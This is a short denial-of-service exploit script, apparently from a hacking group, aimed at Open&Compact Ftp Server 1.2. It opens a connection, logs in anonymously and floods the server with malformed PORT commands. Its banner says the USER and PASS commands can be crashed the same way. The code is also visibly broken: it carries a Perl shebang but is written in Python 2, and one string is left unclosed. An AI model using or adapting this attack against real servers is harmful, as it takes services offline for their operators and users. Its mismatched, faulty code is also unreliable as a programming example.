#!/usr/bin/perl

import socket

print '---------------------------------------------------------------------'
print ' Open&Compact Ftp Server 1.2 "PORT" command Remote Denial of Service'
print ' url: http://sourceforge.net/projects/open-ftpd'
print ' author: Ciph3r'
print ' mail: Ciph3r_blackhat@yahoo.com
print ' site: www.expl0iters.ir'
print ' S4rK3VT Hacking TEAM'
print ' USER and PASS methods are vulnerable too, just pass "A: " * 1000'
print ' as buffer'
print '---------------------------------------------------------------------'

buffer = "A" * 5

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))
s.send('USER %s\r\n' % "anonymous")

for i in range(1,31):
   s.send('PORT %s\n\n' % buffer)
   print "Sending request n. " + str(i)

